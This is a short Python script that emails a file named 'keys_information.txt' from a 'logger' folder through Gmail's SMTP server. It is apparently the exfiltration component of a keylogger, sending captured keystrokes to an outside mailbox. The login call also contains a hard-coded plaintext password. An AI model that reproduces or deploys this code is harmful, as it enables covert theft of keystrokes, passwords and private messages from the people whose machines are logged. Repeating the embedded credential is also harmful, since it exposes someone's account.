# Import necessary modules
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# Define the function to send an email with an attachment
def send_email(filename, attachment_path, toaddr):
    # Your email address
    fromaddr = ""  # Replace with your actual email address

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    # Email body
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    # Read the attachment file
    attachment_file = open(attachment_path, 'rb')

    # Create a MIMEBase object
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment_file.read())

    # Encode the attachment in base64
    encoders.encode_base64(p)

    # Add header for attachment
    p.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(p)

    # Connect to the SMTP server and send the email
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "Laxmi@1313")  # Replace with your actual email password

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# Call the function to send the email with the attachment
send_email("keys_information.txt", r"C:\Users\Dell\OneDrive\Desktop\logger\keys_information.txt", toaddr="")
